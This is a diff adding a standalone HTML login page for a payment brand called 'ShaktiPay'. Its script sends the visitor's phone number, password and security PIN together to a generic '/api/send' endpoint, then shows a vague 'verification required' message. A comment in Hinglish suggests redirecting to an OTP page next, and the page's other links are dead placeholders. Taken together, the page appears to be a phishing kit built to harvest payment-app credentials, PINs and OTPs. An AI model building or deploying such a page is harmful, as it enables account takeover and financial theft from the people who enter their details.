@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ShaktiPay - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #fcf8f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #fcf8f2;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo-circle {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0f1c3f, #ff7b00);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 15px auto;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        .logo-circle span {
+            color: white;
+            font-size: 40px;
+            font-weight: bold;
+        }
+        .brand-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0f1c3f;
+        }
+        .brand-title span {
+            color: #ff7b00;
+        }
+        .input-group {
+            position: relative;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 15px 15px 15px 50px;
+            border: none;
+            border-radius: 30px;
+            background: #ffffff;
+            font-size: 16px;
+            color: #333;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+            outline: none;
+        }
+        .input-group input::placeholder {
+            color: #aaa;
+        }
+        .input-group .icon {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+        }
+        .options-row {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            padding: 0 10px;
+            font-size: 14px;
+        }
+        .options-row a {
+            color: #ff7b00;
+            text-decoration: none;
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #666;
+        }
+        .privacy-row {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #2e7d32;
+        }
+        .privacy-row a {
+            color: #ff7b00;
+            text-decoration: underline;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 30px;
+            background: linear-gradient(90deg, #ff8c00, #ff6600);
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 123, 0, 0.3);
+            transition: opacity 0.2s;
+        }
+        .submit-btn:active {
+            opacity: 0.9;
+        }
+        .footer-links {
+            margin-top: 30px;
+            text-align: center;
+        }
+        .footer-links a {
+            color: #ff7b00;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .version {
+            margin-top: 40px;
+            color: #bbb;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo-section">
+            <div class="logo-circle">
+                <span>S</span>
+            </div>
+            <div class="brand-title">Shakti<span>Pay</span></div>
+        </div>
+
+        <form id="loginForm" style="width: 100%;">
+            <div class="input-group">
+                <span class="icon">👤</span>
+                <input type="tel" id="phone" placeholder="Phone" required pattern="[0-9]{10}">
+            </div>
+
+            <div class="input-group">
+                <span class="icon">🔒</span>
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+
+            <!-- Extra PIN Option as requested -->
+            <div class="input-group">
+                <span class="icon">🔑</span>
+                <input type="password" id="pin" placeholder="Security PIN (4-6 digits)" maxlength="6" required>
+            </div>
+
+            <div class="options-row">
+                <a href="#">Register</a>
+                <label class="remember-me">
+                    <input type="checkbox" id="remember"> Remember Me
+                </label>
+            </div>
+
+            <div class="privacy-row">
+                <span>✔</span> Agree <a href="#">"User Privacy Agreement"</a>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">Sign In</button>
+        </form>
+
+        <div class="footer-links">
+            <a href="#">Forget Password</a>
+        </div>
+
+        <div class="version">v1.4.4</div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const pin = document.getElementById('pin').value;
+            const btn = document.getElementById('submitBtn');
+
+            btn.disabled = true;
+            btn.innerText = 'Signing In...';
+
+            try {
+                const response = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ phone, password, pin })
+                });
+
+                const result = await response.json();
+                
+                if (response.ok) {
+                    alert('Login processing / Verification required.');
+                    // Aap yahan chahein toh next OTP page par redirect kar sakte hain
+                } else {
+                    alert('Something went wrong. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Connection error!');
+            } finally {
+                btn.disabled = false;
+                btn.innerText = 'Sign In';
+            }
+        });
+    </script>
+</body>
+</html>
